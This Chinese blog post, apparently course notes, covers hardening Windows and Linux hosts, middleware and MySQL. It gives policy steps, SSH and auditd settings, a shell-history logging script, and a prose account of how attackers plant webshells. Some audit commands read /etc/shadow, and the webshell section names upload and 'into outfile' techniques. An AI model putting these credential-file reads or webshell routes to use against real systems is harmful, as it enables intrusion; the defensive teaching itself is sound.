<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214120929.png" alt="image-20220720214120929"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214057031.png" alt="image-20220720214057031"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214259704.png" alt="image-20220720214259704"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214317607.png" alt="image-20220720214317607"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214331949.png" alt="image-20220720214331949"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220720214346660.png" alt="image-20220720214346660"></p>
<h1 id="系统及中间件加固"><a href="#系统及中间件加固" class="headerlink" title="系统及中间件加固"></a>系统及中间件加固</h1><h2 id="windows-主机加固"><a href="#windows-主机加固" class="headerlink" title="windows 主机加固"></a>windows 主机加固</h2><p><strong>账户管理和认证授权</strong></p>
<p>账户<br>默认账户安全<br>禁用Guest账户。<br>禁用或删除其他无用账户（建议先禁用账户三个月，待确认没有问题后删除。）</p>
<p>思考：<br>1、为什么要禁用Guest用户？</p>
<pre><code>Guest账户为临时账户，但是该账户允许用户登录到网络、浏览internet以及关闭计算机。黑客可以通过guest用户提权到administrator组得到管理员权限，进行后渗透。
</code></pre>
<p>2、为什么禁用或删除其他无用账户？</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">防止提权</span><br></pre></td></tr></table></figure>

<p>3、为什么建议先禁用账户三个月，待确认没有问题后删除？</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为直接删除，有些正常用户就无法使用了，为了避免影响业务所以先禁用三个月，在三个月之内需要使用的用户发现异常会联系你，也就知道哪些是正常用户哪些该用户该删除。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>实操</strong></p>
<p>•打开 计算机 &gt; 管理 &gt; 本地用户和组 &gt; 用户中，双击 Guest 帐户，在属性中选中 帐户已禁用，单击 确定。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225125458.png" alt="image-20220722225125458"></p>
<p>•按照用户分配帐户<br>•按照用户分配帐户。根据业务要求，设定不同的用户和用户组。例如，管理员用户，数据库用户，审计用户，来宾用户等。<br>•打开 计算机 &gt; 管理 &gt; 本地用户和组 &gt; 用户中，根据您的业务要求设定不同的用户和用户组，包括管理员用户、数据库用户、审计用户、来宾用户等。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225159840.png" alt="image-20220722225159840"></p>
<hr>
<p><strong>口令</strong><br>•cmd下secpol.msc<br>•密码复杂度<br>•密码复杂度要求必须满足以下策略：<br>•最短密码长度要求八个字符。<br>•启用本机组策略中密码必须符合复杂性要求的策略。<br>•即密码至少包含以下四种类别的字符中的两种：<br>•英语大写字母 A, B, C, … Z<br>•英语小写字母 a, b, c, … z<br>•西方阿拉伯数字 0, 1, 2, … 9<br>•非字母数字字符，如标点符号，@, #, $, %, &amp;, *等<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 密码策略 中，确认 密码必须符合复杂性要求 策略已启用。<br>•密码最长留存期<br>•对于采用静态口令认证技术的设备，帐户口令的留存期不应长于90天。<br>•操作步骤打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 密码策略 中，配置 密码最长使用期限 不大于90天。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225300240.png" alt="image-20220722225300240"></p>
<p>•帐户锁定策略<br>•对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过10次后，锁定该用户使用的帐户。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 帐户锁定策略 中，配置 帐户锁定阈值 不大于10次。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225339252.png" alt="image-20220722225339252"></p>
<hr>
<p><strong>授权</strong></p>
<p>•远程关机<br>•在本地安全设置中，从远端系统强制关机权限只分配给Administrators组。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 从远端系统强制关机 权限只分配给Administrators组。<br>•本地关机在本地安全设置中关闭系统权限只分配给Administrators组。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 关闭系统 权限只分配给Administrators组。<br>•用户权限指派<br>•在本地安全设置中，取得文件或其它对象的所有权权限只分配给Administrators组。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 取得文件或其它对象的所有权 权限只分配给Administrators组。<br>•授权帐户登录<br>•在本地安全设置中，配置指定授权用户允许本地登录此计算机。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 允许本地登录 权限给指定授权用户。<br>•授权帐户从网络访问<br>•在本地安全设置中，只允许授权帐号从网络访问（包括网络共享等，但不包括终端服务）此计算机。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 从网络访问此计算机 权限给指定授权用户。</p>
<hr>
<p><strong>日志配置操作</strong></p>
<p>•审核登录<br>•设备应配置日志功能，对用户登录进行记录。记录内容包括用户登录使用的帐户、登录是否成功、登录时间、以及远程登录时、及用户使用的IP地址。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核登录事件。<br>•审核策略<br>•启用本地安全策略中对Windows系统的审核策略更改，成功和失败操作都需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核策略更改。<br>•审核对象访问<br>•启用本地安全策略中对Windows系统的审核对象访问，成功和失败操作都需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核对象访问。<br>•审核事件目录服务访问<br>•启用本地安全策略中对Windows系统的审核目录服务访问，仅需要审核失败操作。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核目录服务器访问。<br>•审核特权使用<br>•启用本地安全策略中对Windows系统的审核特权使用，成功和失败操作都需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核特权使用。<br>•审核系统事件<br>•启用本地安全策略中对Wi d 系统的审核系统事件 成功和失败操作都需要审核<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核系统事件。<br>•审核帐户管理<br>•启用本地安全策略中对Windows系统的审核帐户管理，成功和失败操作都要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核帐户管理。<br>•审核过程追踪<br>•启用本地安全策略中对Windows系统的审核进程追踪，仅失败操作需要审核。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核进程追踪。<br>•日志文件大小<br>•设置应用日志文件大小至少为 8192 KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。并设置当达到最大的日志尺寸时，按需要轮询记录日志。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 事件查看器，配置应用日志、系统日志、安全日志属性中的日志大小，以及设置当达到最大的日志尺寸时的相应策略。</p>
<hr>
<p><strong>IP协议安全配置</strong></p>
<p>•IP协议安全<br>•启用SYN攻击保护<br>•启用SYN攻击保护。<br>•指定触发SYN洪水攻击保护所必须超过的TCP连接请求数阈值为5。<br>•指定处于 SYN_RCVD 状态的 TCP 连接数的阈值为500。<br>•指定处于至少已发送一次重传的 SYN_RCVD 状态中的 TCP 连接数的阈值为400。<br>•操作步骤<br>•打开 注册表编辑器，根据推荐值修改注册表键值。<br>•Windows Server 2012<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect<br>•推荐值：2<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\TcpMaxHalfOpen<br>•推荐值：500<br>•Windows Server 2008<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SynAttackProtect<br>•推荐值：2<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxPortsExhausted<br>•推荐值：5<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpen<br>•推荐值：500<br>•HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TcpMaxHalfOpenRetried<br>•推荐值：400</p>
<hr>
<p><strong>文件权限</strong></p>
<p>•共享文件夹及访问权限<br>•关闭默认共享<br>•非域环境中，关闭Windows硬盘默认共享，例如C$，D$。<br>•操作步骤<br>•打开 注册表编辑器，根据推荐值修改注册表键值。<br>•注意： Windows Server 2012版本已默认关闭Windows硬盘默认共享，且没有该注册表键值。<br>•HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer<br>•推荐值： 0<br>•共享文件夹授权访问<br>•每个共享文件夹的共享权限，只允许授权的帐户拥有共享此文件夹的权限。<br>•操作步骤<br>•每个共享文件夹的共享权限仅限于业务需要，不要设置成为 Everyone。打开 控制面板 &gt; 管理工具 &gt; 计算机管理，在共享文件夹 中，查看每个共享文件夹的共享权限。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722225939164.png" alt="image-20220722225939164"></p>
<hr>
<p><strong>服务安全</strong></p>
<p>•禁用TCP/IP上的NetBIOS<br>•禁用TCP/IP上的NetBIOS协议，可以关闭监听的 UDP 137（netbios-ns）、UDP 138（netbios-dgm）以及 TCP 139（netbios-ssn）端口。<br>•操作步骤<br>•在 计算机管理 &gt; 服务和应用程序 &gt; 服务 中禁用 TCP/IP NetBIOS Helper 服务。<br>•在网络连接属性中，双击 Internet协议版本4（TCP/IPv4），单击 高级。在 WINS 页签中，进行如下设置：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230058011.png" alt="image-20220722230058011"></p>
<p>•禁用不必要的服务<br>•禁用不必要的服务，请参考：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230118317.png" alt="image-20220722230118317"></p>
<hr>
<p><strong>安全选项</strong></p>
<p>•启用安全选项<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 安全选项 中，进行如下设置：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722230239898.png" alt="image-20220722230239898"></p>
<p>•禁用未登录前关机<br>•服务器默认是禁止在未登录系统前关机的。如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客造成可乘之机，强烈建议禁用未登录前关机功能。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 安全选项 中，禁用 关机：允许系统在未登录前关机 策略。</p>
<hr>
<p><strong>其他安全配置</strong></p>
<p>•防病毒管理<br>•Windows系统需要安装防病毒软件。<br>•操作步骤<br>•安装企业级防病毒软件，并开启病毒库更新及实时防御功能。<br>•7.2 设置屏幕保护密码和开启时间<br>•设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。<br>•操作步骤<br>•启用屏幕保护程序，设置等待时间为 5分钟，并启用 在恢复时使用密码保护。<br>•7.3 限制远程登录空闲断开时间<br>•对于远程登录的帐户，设置不活动超过时间15分钟自动断开连接。<br>•操作步骤<br>•打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 安全选项 中，设置 Microsoft网络服务器：暂停会话前所需的空闲时间数量属性为15分钟。<br>•7.4 操作系统补丁管理<br>•安装最新的操作系统Hotfix补丁。安装补丁时，应先对服务器系统进行兼容性测试。<br>•操作步骤<br>•安装最新的操作系统Hotfix补丁。安装补丁时，应先对服务器系统进行兼容性测试。<br>•注意：对于实际业务环境服务器，建议使用通知并自动下载更新，但由管理员选择是否安装更新，而不是使用自动安装更新，防止自动更新补丁对实际业务环境产生影响。</p>
<h2 id="linux主机加固"><a href="#linux主机加固" class="headerlink" title="linux主机加固"></a>linux主机加固</h2><p><strong>账号和口令</strong></p>
<p>•禁用或删除无用账号<br>•减少系统无用账号，降低安全风险。</p>
<p>•操作步骤<br>•cat /etc/shadow 查看有多少账户<br>•使用命令 userdel &lt;用户名&gt; 删除不必要的账号。<br>•使用命令 passwd -l &lt;用户名&gt; 锁定不必要的账号。<br>•使用命令 passwd -u &lt;用户名&gt; 解锁必要的账号。</p>
<p>•检查特殊账号<br>•检查是否存在空口令和root权限的账号。<br>•操作步骤<br>•查看空口令和root权限账号，确认是否存在异常账号：<br>•使用命令 awk -F: ‘($2==””)’ /etc/shadow 查看空口令账号。<br>•使用命令 awk -F: ‘($3==0)’ /etc/passwd 查看UID为零的账号。 //root权限的账户<br>•加固空口令账号：<br>•使用命令 passwd &lt;用户名&gt; 为空口令账号设定密码。<br>•确认UID为零的账号只有root账号。</p>
<p>•添加口令策略<br>•加强口令的复杂度等，降低被猜解的可能性。<br>•操作步骤<br>•使用命令 vi /etc/login.defs 修改配置文件。<br>•PASS_MAX_DAYS 90 #新建用户的密码最长使用天数<br>•PASS_MIN_DAYS 0 #新建用户的密码最短使用天数<br>•PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数<br>•使用chage命令修改用户设置。<br>•例如，chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt;表示将此用户的密码最长使用天数设为30，最短使用天数设为0，密码2000年1月1日过期，过期前七天警告用户。<br>•设置连续输错三次密码，账号锁定五分钟。使用命令 vi /etc/pam.d/common-auth修改配置文件，在配置文件中添加 auth required pam_tally.so onerr=fail deny=3 unlock_time=300。<br>•限制用户su<br>•限制能su到root的用户。<br>•操作步骤<br>•使用命令 vi /etc/pam.d/su修改配置文件，在配置文件中添加行。例如，只允许test组用户su到root，则添加 auth required pam_wheel.so group=test。<br>•禁止root用户直接登录<br>•限制root用户直接登录。<br>•操作步骤<br>•创建普通权限账号并配置密码,防止无法远程登录;<br>•使用命令 vi /etc/ssh/sshd_config修改配置文件将PermitRootLogin的值改成no，并保存，然后使用service sshd restart重启服务。</p>
<hr>
<p><strong>服务</strong></p>
<p>•关闭不必要的服务<br>•关闭不必要的服务（如普通服务和xinetd服务），降低风险。<br>•操作步骤<br>•使用命令systemctl disable &lt;服务名&gt;设置服务在开机时不自动启动。<br>•chkconfig –list 查看启动服务<br>•说明： 对于部分老版本的Linux操作系统（如CentOS 6），可以使用命令chkconfig –level &lt;init级别&gt; &lt;服务名&gt; off设置服务在指定init级别下开机时不自动启动。<br>•SSH服务安全<br>•对SSH服务进行安全加固，防止暴力破解成功。<br>•操作步骤<br>•使用命令 vim /etc/ssh/sshd_config 编辑配置文件。<br>•不允许root账号直接登录系统。<br>•设置 PermitRootLogin 的值为 no。<br>•修改SSH使用的协议版本。<br>•设置 Protocol 的版本为 2。<br>•修改允许密码错误次数（默认6次）。<br>•设置 MaxAuthTries 的值为 3。<br>•配置文件修改完成后，重启sshd服务生效。</p>
<hr>
<p><strong>文件系统</strong></p>
<p>•设置umask值<br>•设置默认的umask值，增强安全性。<br>•操作步骤<br>•使用命令 vi /etc/profile 修改配置文件，添加行 umask 027， 即新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。<br>•设置登录超时<br>•设置系统登录后，连接超时时间，增强安全性。<br>•操作步骤<br>•使用命令 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为TMOUT=180，即超时时间为三分钟。</p>
<hr>
<p><strong>日志</strong></p>
<p>•syslogd日志<br>•启用日志功能，并配置日志记录。<br>•操作步骤<br>•Linux系统默认启用以下类型日志：<br>•系统日志（默认）/var/log/messages<br>•cron日志（默认）/var/log/cron<br>•安全日志（默认）/var/log/secure<br>•注意：部分系统可能使用syslog-ng日志，配置文件为：/etc/syslog-ng/syslog-ng.conf。<br>•您可以根据需求配置详细日志。<br>•记录所有用户的登录和操作日志<br>•通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<br>•操作步骤<br>•运行 [root@xxx /]# vim /etc/profile打开配置文件。<br>•在配置文件中输入以下内容：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">USER=`whoami`</span><br><span class="line">USER_IP=`who -u am i <span class="number">2</span>&gt;<span class="regexp">/dev/</span>null| awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>|sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$USER_IP&quot;</span> = <span class="string">&quot;&quot;</span> ]; then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="regexp">/var/</span>log/history ]; then</span><br><span class="line">mkdir <span class="regexp">/var/</span>log/history</span><br><span class="line">chmod <span class="number">777</span> <span class="regexp">/var/</span>log/history</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span> ]; then</span><br><span class="line">mkdir <span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line">chmod <span class="number">300</span> <span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span></span><br><span class="line">fi</span><br><span class="line">export HISTSIZE=<span class="number">4096</span></span><br><span class="line">DT=`date +<span class="string">&quot;%Y%m%d_%H:%M:%S&quot;</span>`</span><br><span class="line">export HISTFILE=<span class="string">&quot;/var/log/history/$&#123;LOGNAME&#125;/$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT&quot;</span></span><br><span class="line">chmod <span class="number">600</span></span><br><span class="line"><span class="regexp">/var/</span>log<span class="regexp">/history/</span><span class="variable">$&#123;LOGNAME&#125;</span><span class="regexp">/*history* 2&gt;/</span>dev/null</span><br><span class="line">运行 [root@xxx <span class="regexp">/]# source /</span>etc/profile 加载配置生效。</span><br><span class="line">注意： <span class="regexp">/var/</span>log<span class="regexp">/history 是记录日志的存放位置，可以自定义。通过上述步骤，可以在 /</span>var<span class="regexp">/log/</span>history 目录下以每个用户为名新建一个文件夹，每次用户退出后都会产生以用户名、登录IP、时间的日志文件，包含此用户本次的所有操作（root用户除外）。同时，建议您使用OSS服务收集存储日志。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>安全审计</strong></p>
<p>•审计内容包括系统内重要的安全相关事件<br>•实操：<br>•结果将导致发生故障或入侵事件不便于分析故障或入侵行为，不能再需要时作为证据</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">•service rsyslog ststus,service auditd status,</span><br><span class="line">•cat <span class="regexp">/etc/</span>audit/auditd.conf中是否配置</span><br><span class="line">•write_logs = yes</span><br><span class="line">•log_file = <span class="regexp">/var/</span>log<span class="regexp">/audit/</span>audit.log</span><br><span class="line">•log_format = RAW</span><br><span class="line">•max_log_file = <span class="number">8</span></span><br><span class="line">•num_logs = <span class="number">5</span></span><br><span class="line">•max_log_file_action = ROTATE</span><br><span class="line">•cat <span class="regexp">/etc/</span>audit/audit.rules查看是否存在</span><br><span class="line">• -w <span class="regexp">/etc/</span>passwd -p rwa -k passwd_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>shadow -p rwa -k shadow_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>sudoers -p rwa -k sudoers_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>rsyslog.conf -p rwa -k rsyslog_changes</span><br><span class="line">• -w <span class="regexp">/etc/g</span>roup -p rwa -k group_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/message -p rwa -k message_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/secure -p rwa -k secure_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/maillog -p rwa -k maillog_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/cron -p rwa -k cron_changes</span><br><span class="line">• -w <span class="regexp">/var/</span>log/spooler -p rwa -k spooler_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>audit/audit.rules -p rwa -k audit_changes</span><br><span class="line">• -w <span class="regexp">/etc/</span>audit<span class="regexp">/rules.d/</span>audit.rules -p rwa -k audit_changes</span><br><span class="line">•cat <span class="regexp">/etc/</span>rsyslog.conf 查看是否存在</span><br><span class="line">•kern.warning;*.err;*.info;kern.debug;daemon.notice;mail.none;authpriv.none;cron.none <span class="regexp">/var/</span>log/kern.log</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>时间</strong></p>
<p>•安全审计记录未包含所有重要的审计记录字段，未配置NTP校正系统时间<br>•操作：date查看当前系统时间<br>•意义：无法进行关联分析，不能及时对部分较复杂的安全事件进行发现和报警</p>
<p>•操作系统未安装专门的审计进程保护软件，无法对审计进程进行保护，避免受到未预期中断，日志保留时间小于6个月<br>•cat /etc/rsyslog.conf中查看是否存在<br>•<code>*.*@@192.168.101.100:514</code><br>•或询问是否存在其他措施对审计日志进行保护</p>
<hr>
<p><strong>更新系统内核和安装防病毒软件</strong></p>
<p>•使用命令uname -sr查看<br>•Centos7/RHEL7 3.10.0-1062.1.2.el7<br>•Cetnos6/RHEL6 2.6.32-754.23.1.el6<br>•询问管理员是否有月度主机扫描报告<br>定期对操作系统进行漏洞扫描并修补发现的漏洞，未更新系统内核至官方最新安全版。</p>
<hr>
<p><strong>Linux系统安装杀毒软件clamav</strong></p>
<p>•在线演示<br>•<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hftian/p/11711701.html">https://www.cnblogs.com/hftian/p/11711701.html</a></p>
<p>•Webshell 样例<br>•以下是一个php的样例。从界面看，它的功能还是比较全的，可以对服务器的文件目录进行读写操作。如果你是网站管理员的话，肯定不希望普通用户获得下面的权限。</p>
<p>•Webshell如何被注入<br>•常见的Webshell植入方式以下类型：<br>•利用站点上传漏洞，上传Webshell。<br>•系统前台的上传业务可被利用来上传Webshell脚本，而被上传的目录往往对用户开放可执行权限。在Web中有上传图像、资料文件的地方，上传完后通常会向客户端返回上传文件的完整URL信息；该URL一般是常见的image、upload等目录。<br>•如果Web服务器对网站存取权限或者文件夹目录权限控制不严，就可能被利用来实现Webshell攻击。攻击者可以利用上传功能上传一个脚本文件，然后通过URL访问并执行这个脚本；然后攻击者就可以上传Webshell到网站的任意目录中，从而拿到网站的管理员控制权限。<br>•黑客获取管理员的后台密码，登录到后台系统，利用后台的管理工具向配置文件写入Webshell木马；或者私自添加上传类型，允许上传类似ASP、PHP格式的脚本程序文件。<br>•利用数据库备份与恢复功能获取Webshell。例如，备份时把备份文件的后缀改成 .asp；如果后台有MySQL数据查询功能，黑客可以执行select..in To outfile查询输出PHP文件，并把代码插入到MySQL，从而生成Webshell的木马。<br>•系统中其他站点被攻击，或者服务器上还搭载了FTP服务器。FTP服务器被攻击时被注入了Webshell的木马，导致网站系统被感染。<br>•黑客直接攻击Web服务器系统漏洞，实现入侵。Web服务器在系统层面也可能存在漏洞，如果黑客利用其漏洞攻击服务器系统；在获取其权限后，黑客就可以在Web服务器目录里上传Webshell文件。<br>•综上，Webshell能够入侵到系统，一般是由于以下原因：<br>•通过Web站点漏洞上传Webshell。<br>•Webshell能够被注入，在很大程度是由于服务器或中间件的安全漏洞。例如，以下常见漏洞都可能被利用来注入Webshell：旧版本的IIS目录解析漏洞、文件名解析漏洞、应用后台暴露和弱口令、Fast-CGI解析漏洞、Apache文件解析漏洞、截断上传、后台数据库备份功能上传、数据库语句上传漏洞等。<br>•站点部署时混入了Webshell文件。<br>•大量的用户在使用从网上下载的第三方开源代码时，其代码本身已经混入了Webshell的恶意脚本，造成二次入侵或多次入侵。所以在部署前期，如果不是新开发的代码，都需要对代码进行恶意文件扫描查杀，防止上线后被入侵。</p>
<hr>
<p><strong>如何防止系统被植入Webshell</strong></p>
<p>•配置必要的防火墙并开启防火墙策略；防止暴露不必要的服务，为黑客提供利用条件。<br>•对服务器进行 安全加固。例如，关闭远程桌面功能、定期更换密码、禁止使用最高权限用户运行程序、使用HTTPS加密协议。<br>•加强权限管理，对敏感目录进行权限设置，限制上传目录的脚本执行权限，不允许配置执行权限等。<br>•安装Webshell检测工具，发现检测结果后，立即隔离查杀，并排查漏洞。<br>•排查程序存在的漏洞，并及时修补漏洞。您可以通过应急响应服务人工界入，协助排查漏洞及入侵原因，同时可以选用商业Web应用防火墙进行防御，降低被入侵机率。</p>
<hr>
<p><strong>网站被植入Webshell的解决方案</strong></p>
<p>•Webshell<br>•从字面上理解，”Web”指需要服务器开放Web服务，”shell”指取得对服务器的某种程度的操作权限。Webshell指匿名用户（入侵者）通过网站端口，获取网站服务器的一定操作权限。<br>•Webshell通常是以ASP、PHP、JSP、ASA或者CGI等网页文件形式存在的一种命令执行环境，也称为网页后门。黑客在入侵网站后，通常会将Webshell后门文件与网站服务器Web目录下正常的网页文件混在一起；然后使用浏览器来访问这些后门，得到命令执行环境，以达到控制网站或者Web系统服务器的目的。<br>•黑客如果想使用Webshell完成一些特殊的功能，就不可避免地用到一些特殊函数。通过对这些函数进行对照特征值检查，就能够定位Webshell，但是Webshell本身也会进行加密来躲避这种检测。</p>
<h2 id="中-间-件-加-固"><a href="#中-间-件-加-固" class="headerlink" title="中 间 件 加 固"></a>中 间 件 加 固</h2><p><strong>apache加固</strong></p>
<p>以专门的用户帐号和用户组运行Apache服务</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232126336.png" alt="image-20220722232126336"></p>
<p>授权设置</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232149625.png" alt="image-20220722232149625"></p>
<p>日志设置</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232223831.png" alt="image-20220722232223831"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232235811.png" alt="image-20220722232235811"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232250740.png" alt="image-20220722232250740"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232310109.png" alt="image-20220722232310109"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232325275.png" alt="image-20220722232325275"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232341493.png" alt="image-20220722232341493"></p>
<hr>
<p><strong>Tomcat安全加固</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232412514.png" alt="image-20220722232412514"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232425547.png" alt="image-20220722232425547"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232442109.png" alt="image-20220722232442109"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232452273.png" alt="image-20220722232452273"></p>
<hr>
<p><strong>nginx安全加固</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232530087.png" alt="image-20220722232530087"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232541764.png" alt="image-20220722232541764"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232551597.png" alt="image-20220722232551597"></p>
<h2 id="数-据-库-加-固"><a href="#数-据-库-加-固" class="headerlink" title="数 据 库 加 固"></a>数 据 库 加 固</h2><p><strong>mysql加固</strong></p>
<p>漏洞发现<br>通过漏扫发现数据库问题</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232632292.png" alt="image-20220722232632292"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220722232644526.png" alt="image-20220722232644526"></p>
